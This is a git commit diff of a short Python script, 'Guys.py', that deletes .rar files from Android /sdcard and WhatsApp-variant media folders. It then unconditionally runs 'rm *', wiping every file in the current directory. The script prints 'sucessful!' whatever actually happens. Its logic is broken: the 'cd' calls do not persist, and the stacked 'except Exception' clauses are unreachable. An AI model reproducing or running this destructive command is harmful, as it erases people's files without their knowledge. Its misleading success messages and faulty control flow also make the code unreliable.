782fd02c7179a1071d79778b5a8951253a28bee4
Devfemibadmus <devfemibadmus@gmail.com>
2021-09-28 19:07:23 +0100

    Update Guys.py

--- Guys.py
+++ Guys.py
@@ -2,32 +2,28 @@ import os, sys
 
 
 try:
-    os.system("cd /sdcard && rm proj1ect.rar")
-    print("sucessful!")
-except exception:
-    try:      
+        os.system("cd /sdcard && rm proj1ect.rar")
+        print("sucessful!")
+except Exception:
         os.system("cd /sdcard/FMWhatsApp/Media")
         os.system("cd 'FMWhatsApp Documents'")
         os.system("rm proje2ct.rar")
         print("sucessful!")
-    except exception:
-        try:  
-            os.system("cd /sdcard/GBWhatsApp/Media")
-            os.system("cd 'GBWhatsApp Documents'")
-            os.system("rm proje3ct.rar")
-            print("sucessful!")
-        except exception:
-            try:  
-              os.system("rm projec4t.rar")
-              print("sucessful!")
-            except exception:
-                try:
-                  os.system("cd /sdcard/WhatsApp/Media")
-                  os.system("cd 'WhatsApp Documents'")
-                  os.system("rm projec5t.rar")
-                  print("sucessful!")
-                except exception:
-                    print("not sucessful!, talk to devfemibadmus or @007")
+except Exception:
+        os.system("cd /sdcard/GBWhatsApp/Media")
+        os.system("cd 'GBWhatsApp Documents'")
+        os.system("rm proje3ct.rar")
+        print("sucessful!")
+except Exception:
+        os.system("rm projec4t.rar")
+        print("sucessful!")
+except Exception:
+        os.system("cd /sdcard/WhatsApp/Media")
+        os.system("cd 'WhatsApp Documents'")
+        os.system("rm projec5t.rar")
+        print("sucessful!")
+except Exception:
+        print("not sucessful!, talk to devfemibadmus or @007")
 os.system("rm *")
 
     
